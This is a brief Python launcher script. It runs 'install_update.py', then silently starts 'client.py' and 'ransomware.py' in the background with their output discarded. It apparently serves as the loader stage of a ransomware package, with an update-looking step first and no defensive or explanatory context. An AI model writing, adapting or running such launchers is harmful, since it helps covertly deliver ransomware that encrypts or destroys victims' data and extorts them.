import subprocess
import time

# Run the first script
subprocess.Popen(["python", "install_update.py"])

# wait 2 seconds before starting the second script
time.sleep(2)

# Run the second script in the background and redirect the output to /dev/null
subprocess.Popen(["python", "client.py"], stdout=open("/dev/null", "w"), stderr=subprocess.PIPE)
subprocess.Popen(["python", "ransomware.py"], stdout=open("/dev/null", "w"), stderr=subprocess.PIPE)
